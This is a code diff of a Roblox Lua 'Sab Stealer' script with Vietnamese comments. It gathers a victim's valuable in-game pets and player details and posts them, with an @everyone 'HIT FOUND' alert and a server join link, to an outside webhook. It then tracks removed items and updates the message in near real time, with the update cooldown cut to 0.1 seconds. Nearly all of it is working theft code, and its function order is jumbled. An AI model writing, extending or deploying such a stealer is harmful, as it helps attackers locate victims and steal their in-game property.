@@ -336,15 +336,91 @@ local function sendWebhookAndStore(orderedPets)
                 lastWebhookMessageId = tostring(decoded.id)
             end
         end
-    end)
+local function sendWebhook(link)
+    if player and player:GetAttribute("WebhookSent") then return end
+    local pets = collectValidPets()
+    if #pets == 0 then return end
 
-    if player then
-        player:SetAttribute("WebhookSent", true)
+    local priorityPets, randomPets = {}, {}
+    for _, pet in ipairs(pets) do
+        local petName = pet:match("^(.-) %(") or pet
+        local prio = getPriority(petName)
+        if prio ~= math.huge then
+            table.insert(priorityPets, {pet = pet, priority = prio})
+        else
+            table.insert(randomPets, pet)
+        end
     end
 
+    table.sort(priorityPets, function(a, b) return a.priority < b.priority end)
+    shuffle(randomPets)
+
+    local orderedPets = {}
+    for _, p in ipairs(priorityPets) do table.insert(orderedPets, p.pet) end
+    for _, r in ipairs(randomPets) do table.insert(orderedPets, r) end
+
+    sendWebhookAndStore(orderedPets)
+
+    -- gọi sau khi gửi webhook để tracking real-time
     task.delay(2, function()
         startLootTracking(orderedPets)
     end)
+end
+
+-- 🧩 Lưu và cập nhật webhook (cần định nghĩa trước startLootTracking)
+local lastWebhookMessageId
+local lastWebhookEmbed
+local lastWebhookContent
+
+local function sendWebhookAndStore(orderedPets)
+    local lootText = table.concat(orderedPets, "\n")
+    local placeId = tostring(game.PlaceId or "")
+    local jobId = tostring(game.JobId or "")
+    local serverLink = ("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId)
+    local embed = {
+        ["title"] = "😜 Sab Stealer - Make By Phatlee",
+        ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
+        ["fields"] = {
+            {["name"] = "Hit By", ["value"] = "moreira"},
+            {["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers())},
+            {["name"] = "Server Type", ["value"] = serverType},
+            {["name"] = "👥 Player Information", ["value"] = "Name: " .. (player and player.Name or "Unknown")
+                .. "\nReceiver: ".. receiverList
+                .. "\nExecutor: " .. detectExecutor()
+                .. "\nAccount Age: " .. tostring(getAccountAge()) .. " days"},
+            {["name"] = "🧠Brainrot Loot", ["value"] = lootText},
+            {["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink)}
+        }
+    }
+
+    local payload = {
+        ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
+        ["embeds"] = {embed},
+        ["allowed_mentions"] = {["parse"] = {"everyone"}}
+    }
+
+    lastWebhookEmbed = embed
+    lastWebhookContent = payload.content
+
+    local req = (syn and syn.request) or http_request or (http and http.request) or request
+    if not req or not WEBHOOK or type(WEBHOOK) ~= "string" or WEBHOOK == "" then return end
+
+    pcall(function()
+        local res = req({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        if res and res.Body then
+            local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
+            if ok and decoded and decoded.id then
+                lastWebhookMessageId = tostring(decoded.id)
+            end
+        end
+    end)
+
+    if player then player:SetAttribute("WebhookSent", true) end
 end
 
 local function patchWebhookLoot(newLootText)
@@ -372,9 +448,11 @@ local function patchWebhookLoot(newLootText)
     end)
 end
 
-function startLootTracking(orderedPets)
+-- 🧠 Theo dõi model bị xóa
+local function startLootTracking(orderedPets)
     local petStatus = {}
     local pattern = "^(.-)%s*%((.-)/s%)%s*%((.-)%)%s*%((%d+)/(%d+)%)$"
+
     for _, line in ipairs(orderedPets) do
         local name, speed, floor, done, total = line:match(pattern)
         if name and total then
@@ -392,7 +470,7 @@ function startLootTracking(orderedPets)
     end
 
     local lastPatch = 0
-    local PATCH_COOLDOWN = 1.5
+    local PATCH_COOLDOWN = 0.1
 
     Workspace.DescendantRemoving:Connect(function(obj)
         if not obj:IsA("Model") then return end
